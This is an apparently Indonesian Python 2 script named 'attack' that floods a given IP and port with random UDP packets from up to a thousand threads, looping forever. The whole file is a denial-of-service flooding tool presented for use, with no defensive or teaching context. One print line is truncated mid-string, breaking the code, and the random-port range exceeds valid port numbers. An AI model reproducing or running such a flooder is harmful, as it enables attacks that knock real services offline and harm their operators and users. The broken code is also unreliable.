import socket
import threading
import random
import sys
import os
import time

class attack(threading.Thread):

    def __init__(self, ip, port, psize):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.psize = psize

    def run(self):
        print '\x1b[31mMengirim paket ke IP|\x1b[94mMengirim Ke PORT '                  >
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(self.psize)
        while True:
            sock.sendto(bytes, (self.ip, self.port))


if len(sys.argv) < 2:
    print 'Usage: ' + sys.argv[0] + ' KETIK : IP PORT PACKET THREADS'
    sys.exit()
try:
    threads = sys.argv[4]
except NameError:
    threads = 1000
except IndexError:
    threads = 1000

try:
    if int(sys.argv[3]) > 0 and int(sys.argv[3]) <= 655000:
        psize = int(sys.argv[3])
        print psize
    else:
        psize = 2048
except IndexError:
    psize = 2048

for host in range(int(threads)):
    try:
        port = sys.argv[2]
    except IndexError:
        port = random.randrange(1, 655035, 2)

    at = attack(sys.argv[1], int(port), int(psize))
    at.start()
